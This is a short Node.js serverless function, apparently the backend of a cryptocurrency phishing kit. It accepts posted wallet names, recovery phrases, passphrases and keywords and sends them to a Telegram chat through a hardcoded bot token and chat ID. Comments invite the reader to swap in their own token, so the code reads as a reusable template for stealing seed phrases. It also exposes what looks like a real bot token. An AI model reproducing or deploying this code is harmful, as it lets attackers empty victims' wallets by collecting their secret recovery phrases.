const fetch = require('node-fetch');

exports.handler = async function(event, context) {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  const { imported, phrase, passphrase, keywords } = JSON.parse(event.body);

  const token = '7268474710:AAEKnDq7vcix_xUGrqI5gBU5Yp4C27T82Pk'; // <-- Replace with your bot token
  const chat_id = '6390370714'; // <-- Replace with your chat ID
  const message = `Wallet: ${imported}\nPhrase: ${phrase}\nPassphrase: ${passphrase}\nKeywords: ${keywords}`;
  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id, text: message })
    });
    const data = await response.json();
    return {
      statusCode: 200,
      body: JSON.stringify(data)
    };
  } catch (err) {
    return {
      statusCode: 500,
      body: JSON.stringify({ error: err.toString() })
    };
  }
};
